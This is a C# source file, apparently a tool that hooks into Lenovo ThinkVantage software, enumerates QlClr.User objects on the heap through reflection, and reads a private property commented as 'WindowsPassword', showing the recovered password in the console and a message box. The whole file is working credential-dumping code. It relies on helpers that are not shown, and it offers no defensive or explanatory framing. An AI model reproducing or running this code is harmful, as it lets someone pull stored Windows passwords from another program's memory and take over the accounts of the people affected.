using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;

namespace thinkVantageAuto
{
    class worker
    {
        public static void doWork()
        {
            System.Windows.Forms.DialogResult dialogResult = System.Windows.Forms.DialogResult.Yes;
            while (dialogResult ==   System.Windows.Forms.DialogResult.Yes)
            {
                Type reference = typeof(QlClr.User);
                ConstructorInfo[] ctor = reference.GetConstructors(BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
                object wantedObj = ctor[0].Invoke(new object[2] { null, null });
                object[] allUsers = heapObjects.getAddresses(wantedObj);

                foreach (object obj in allUsers)
                {
                    foundObject objectFound = obj as foundObject;

                    if (objectFound == null)
                        continue;

                    object thisObj = objectFound.targetObject;
                    PropertyInfo[] properties = thisObj.GetType().GetProperties(BindingFlags.Static | BindingFlags.Public | BindingFlags.Instance | BindingFlags.NonPublic);
                    object ret = null;
                    try
                    {
                        System.Threading.Thread call = new System.Threading.Thread
                        (
                            () =>
                            {
                                try { ret = properties[14].GetValue(thisObj, null); }//System.String WindowsPassword }
                                catch { return; }
                            }
                         );
                        call.Start();
                        System.Threading.Thread.Sleep(10);
                        call.Abort();
                        Console.WriteLine(ret.ToString());
                        System.Windows.Forms.MessageBox.Show(ret.ToString());
                    }
                    catch { ret = "cannot eval"; }
                }
                 dialogResult = System.Windows.Forms.MessageBox.Show("Try again", "No QlClr.User object found", System.Windows.Forms.MessageBoxButtons.YesNo);
            }
        }
    }
}
